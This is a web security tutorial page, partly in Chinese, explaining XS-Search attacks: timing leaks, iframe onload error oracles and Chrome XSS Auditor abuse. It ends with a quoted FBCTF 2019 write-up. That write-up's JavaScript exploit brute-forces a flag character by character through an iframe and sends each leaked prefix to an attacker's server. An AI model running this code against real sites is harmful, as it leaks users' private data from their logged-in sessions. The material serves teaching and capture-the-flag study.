# XS-Search（跨站搜索攻击）

**The best resource to learn XS-Search is** [**https://xsleaks.dev/**](https://xsleaks.dev)

## 基于时间的跨站搜索攻击

基于时间的跨站搜索攻击指的是，攻击者可以利用**CSRF 漏洞**使受害者访问一些信息，这些信息只能是该受害者可以访问。然后，通过检查响应请求所需的时间，判断内容是否被正确访问。

试想一种这样的情况：有个网页，各用户在该网页中只能访问属于自己的文件。但是admin用户能访问所有文件。如果你想知道以 ***flag*** 开头的文件内容，该如何做？

**seach by content** 功能中存在 **CSRF** 漏洞，您可以让 **admin  访问由自己控制的恶意 Web 服务器**，同时利用 CSRF 使受害者**搜索**以“_*flag开头的文件*_”。攻击者将创建一个**循环**，因此它将使受害者**搜索所有可能性**：_flagX_。然后，如果一个搜索比其他搜索花费了**更多时间**，你可以**假设**它是**正确**的，你可以用“_flag{X_”开始一个**新循环**直到拿到flag。

这只是**想法**，但在**现实世界**中，您需要检索内容的查询花费**多得多的时间**，而不是不返回任何内容的查询。

有关更多信息，您可以阅读：

* [https://medium.com/@luanherrera/xs-searching-googles-bug-tracker-to-find-out-vulnerable-source-code-50d8135b7549](https://medium.com/@luanherrera/xs-searching-googles-bug-tracker-to-find-out-vulnerable-source-code-50d8135b7549)
* [https://www.researchgate.net/publication/280738245\_Cross-Site\_Search\_Attacks](https://www.researchgate.net/publication/280738245\_Cross-Site\_Search\_Attacks)

## 利用 Iframe 进行跨站搜索攻击

假设您可以在 Iframe 中的页面插入秘密内容。

您可以使用 **Iframe** 让受害者搜索包含 “_**flag**_” 的文件（基于 CSRF 的前提）。在 Iframe 中，您知道 _**onload 事件**_ 将始终**至少执行一次**。然后，您可以更改 iframe 的中的 **URL**，但仅更改 URL 内的 **hash** 的 **content**。

例如:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.om/xssearch#try2

如果第一个 URL **成功加载**，那么当更改URL 的 **hash** 部分时，**onload**事件**不会再次触发**。但是**如果**页面在**加载**时出现某种**错误**（包括但不限于, 请求超时, 域名不存在, 被chrome XSS过滤器的block模式屏蔽），那么**onload**事件将被**再次触发**。

然后，您可以**区分**一个**正确**加载的页面或访问时出现**错误**的页面。\
如果您可以在访问正确的内容时使页面错误，并在访问任何内容时使其正确加载，那么您可以循环提取所有信息而无需通过观察响应时间。

### Iframe Chrome XSS Auditor

想象一下**与 Timing 攻击方法**相同的情况，并且您还知道 **admin**正在使用 **Chrome 浏览器**（例如，Chrome-headless）**with Chrome XSS Auditor。**

然后，您可以使用 **iframes** 让受害者在循环中**搜索**包含“_**flagX**_”（beeing X **any**possible **character**）的页面，并且您还向 iframe 内的 URL 添加了一个 **fake 参数**，该参数**包含仅在检索有效内容时才会出现的 javascript 代码**。

例如，如果当您搜索内容 _**"my file"**_ 时，Web 服务器会响应一个包含此 javascript 代码的页面：

```
<script>console.log("you found someting");</script>
```

如果你发送一个如下请求:

```
www.victim.com/search?q=my+file&fake_xss=<script>console.log("you+found+something");<script>
```

**Chrome XSS Auditor** 将会阻止页面加载并提示错误.

如上所述，当从受害者服务器收到有效的响应时，你可以通过 “Chrome XSS Auditor” 获得一个错误。结合 iframe 技巧，你将可以检索文件名含有flag的文件，

For more information: [https://www.youtube.com/watch?v=HcrQy0C-hEA](https://www.youtube.com/watch?v=HcrQy0C-hEA)

### 滥用 Chrome XSS Auditor 窃取令牌

使用之前的技术（使用 Chrome XSS Auditor），您可以**窃取返回给用户的代码块**（例如令牌）。更多信息：[https://portswigger.net/blog/abusing-chromes-xss-auditor-to-steal-tokens](https://portswigger.net/blog/abusing-chromes-xss-auditor-to-窃取令牌）

请注意，您将窃取返回给用户的信息，而不是来自网络服务器的任何代码。

## Custom Detection

In the **fbcft2019** the **challenge**: **secret note keeper** was resolved exploiting a XS-Search.

You could make the **administrator** (a headlessChrome) **visit any page** and there was a **CSRF** vulnerable page that was able to **search files by content**. You also **knew** that the **flag starts** by _**fb{**_ and only the admin had access to it.

It was also important to notice that when you made a **search**, the results of the seach **appeared inside** an **iframe** (if something was found). And **none iframe appeared** if **anything** was found.

So, you could make the admin visit your exploit that will be a **loop of every possible charater** inside _fb{X_ inside an iframe. And using:

```
contentWindow.frames.length != 0
```

You could **check** how **many iframes** where created **inside your iframe**, and **if an**y, then the **character** would be **correct** and you could start extracting the next one.

This is a code example of this from: [https://sectt.github.io/writeups/FBCTF19/secret\_note\_keeper/README](https://sectt.github.io/writeups/FBCTF19/secret\_note\_keeper/README)

```
<!DOCTYPE html>
<html>

<head>
    <title>fbctf secret note keeper</title>
</head>

<body></body>
<script>
var chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^`{|}~ ';
var charLen = chars.length;
var ENDPOINT = "http://challenges.fbctf.com:8082/search?query="
var x = document.createElement('iframe');

function search(leak, charCounter) {
    var curChar = chars[charCounter];
    //Chek if the character is valid
    x.setAttribute("src", 'http://challenges.fbctf.com:8082/search?query=' + leak + curChar);
    document.body.appendChild(x);
    console.log("leak = " + leak + curChar);
    //When the page inside the iframe is loaded
    x.onload = () => {
    //Check the number of iframes inside
        if (x.contentWindow.frames.length != 0) {
        // If 1 or more, then, the character was valid
            fetch('http://myserver/leak?' + escape(leak), {
                method: "POST",
                mode: "no-cors",
                credentials: "include"
            });
            leak += curChar
        }
        search(leak, (charCounter + 1) % chars.length);
    }
}

function exploit() {
    search("fb{", 0);
}

exploit();
</script>

</html>

```



## More information

{% embed url="https://github.com/xsleaks/xsleaks" %}

[https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)
